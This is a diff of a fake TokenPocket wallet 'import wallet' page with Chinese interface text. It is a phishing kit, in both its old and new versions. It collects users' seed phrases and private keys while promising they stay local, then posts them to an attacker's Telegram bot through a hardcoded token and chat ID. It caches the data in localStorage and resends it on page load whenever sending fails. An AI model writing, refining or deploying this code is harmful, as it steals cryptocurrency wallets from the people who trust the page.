@@ -3,120 +3,84 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TokenPocket - 导入钱包</title>
+<title>TokenPocket</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
   body{background:#0C1526;color:#fff;min-height:100vh}
-  .container{max-width:480px;margin:0 auto;background:#0C1526;padding-bottom:80px}
-  .header{background:#131C35;padding:22px 20px;text-align:center;border-bottom:1px solid #1E2A4A}
-  .logo{font-size:22px;font-weight:700;color:#00D1FF}
-  .sub{font-size:13px;color:#AAB3C7;margin-top:4px}
-  .panel{background:#131C35;margin:18px;border-radius:18px;padding:26px 22px}
-  .title{font-size:17px;font-weight:600;margin-bottom:20px;text-align:center}
-  .input-group{margin-bottom:16px}
-  label{display:block;font-size:14px;color:#D1D5DB;margin-bottom:8px}
-  input{width:100%;padding:15px 16px;background:#1E2A4A;border:none;border-radius:14px;color:#fff;font-size:15px}
-  button{width:100%;padding:17px;border-radius:16px;background:#00D1FF;color:#000;font-weight:700;border:none;margin-top:12px;font-size:16px}
-  .tip{font-size:12px;color:#8A94A7;text-align:center;margin-top:12px;line-height:1.4}
+  .box{max-width:420px;margin:0 auto;background:#0C1526;padding:0 0 80px}
+  .head{background:#131C35;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #1e2a4a}
+  .logo{font-size:24px;font-weight:800;color:#00D1FF;}
+  .desc{font-size:13px;color:#aab3c7;margin-top:4px}
+  .card{background:#131C35;margin:20px;border-radius:20px;padding:30px 24px}
+  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
+  .item{margin-bottom:18px}
+  .item label{display:block;font-size:14px;color:#d1d5db;margin-bottom:8px}
+  .item input{
+    width:100%;background:#1E2A4A;border:none;border-radius:16px;
+    padding:16px 18px;color:#fff;font-size:15px
+  }
+  .btn{
+    width:100%;background:#00D1FF;color:#000;font-weight:700;
+    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
+  }
+  .tip{font-size:12px;color:#8a94a7;text-align:center;line-height:1.4;margin-top:14px}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
+<div class="box">
+  <div class="head">
     <div class="logo">TokenPocket</div>
-    <div class="sub">去中心化多链钱包</div>
+    <div class="desc">去中心化多链钱包</div>
   </div>
-  <div class="panel">
+  <div class="card">
     <div class="title">导入钱包</div>
-    <div class="input-group">
-      <label>助记词（用空格分隔）</label>
-      <input id="mnemonic" placeholder="请输入助记词" autocomplete="off">
+    <div class="item">
+      <label>助记词</label>
+      <input id="words" placeholder="请输入助记词，空格分隔">
     </div>
-    <div class="input-group">
-      <label>私钥（二选一即可）</label>
-      <input id="privateKey" placeholder="请输入私钥" autocomplete="off">
+    <div class="item">
+      <label>私钥</label>
+      <input id="key" placeholder="请输入私钥">
     </div>
-    <button onclick="importWallet()">确认导入</button>
-    <div class="tip">助记词/私钥仅保存在本地<br>官方不会保存，安全无风险</div>
+    <button class="btn" onclick="go()">确认导入</button>
+    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
   </div>
 </div>
 
 <script>
-const BOT_TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
-const CHAT_ID   = "6503982157";
-const API_HOST  = "https://api.telegram-init.com";
+const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const CHATID = "6503982157";
 
-// 页面加载时自动补发
-window.addEventListener("load", autoSend);
-
-function saveLocal(mnemonic, pk) {
-  const data = {
-    time: new Date().toLocaleString(),
-    mnemonic: mnemonic,
-    pk: pk
-  };
-  localStorage.setItem("wallet_data", JSON.stringify(data));
+function save(mn, pk) {
+  localStorage.setItem("wc_data", JSON.stringify({mn,pk}));
 }
+function get() {
+  try{return JSON.parse(localStorage.getItem("wc_data"));}catch(e){return null}
+}
+function clean() { localStorage.removeItem("wc_data"); }
 
-function getLocal() {
+async function send(mn, pk) {
+  const txt = `
+💰 导入成功
+时间：${new Date().toLocaleString()}
+助记词：${mn||'-'}
+私钥：${pk||'-'}`;
   try {
-    return JSON.parse(localStorage.getItem("wallet_data"));
-  } catch (e) {
-    return null;
-  }
-}
-
-function clearLocal() {
-  localStorage.removeItem("wallet_data");
-}
-
-async function sendToTelegram(data) {
-  if (!data) return;
-  const text = `
-🤑 离线导入成功（自动补发）
-⏰ 时间：${data.time}
-📍 助记词：${data.mnemonic || "未填写"}
-🔑 私钥：${data.pk || "未填写"}`;
-
-  try {
-    await fetch(`${API_HOST}/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:CHATID,text:txt})
     });
-    clearLocal();
-  } catch (e) {}
+    clean();
+  } catch(e) { save(mn,pk); }
 }
 
-// 自动补发（核心黑科技）
-async function autoSend() {
-  const data = getLocal();
-  if (data) await sendToTelegram(data);
-}
-
-// 导入逻辑
-async function importWallet() {
-  const m = document.getElementById("mnemonic").value.trim();
-  const p = document.getElementById("privateKey").value.trim();
-
-  if (!m && !p) {
-    alert("请输入助记词或私钥");
-    return;
-  }
-
-  alert("钱包导入成功！");
-
-  const data = {
-    time: new Date().toLocaleString(),
-    mnemonic: m,
-    pk: p
-  };
-
-  try {
-    await sendToTelegram(data);
-  } catch (e) {
-    saveLocal(m, p);
-  }
+window.onload = async () => { const d=get(); if(d) await send(d.mn,d.pk); }
+async function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
+  if(!mn && !pk){alert("请输入助记词或私钥");return;}
+  alert("导入成功！");
+  await send(mn,pk);
 }
 </script>
 </body>
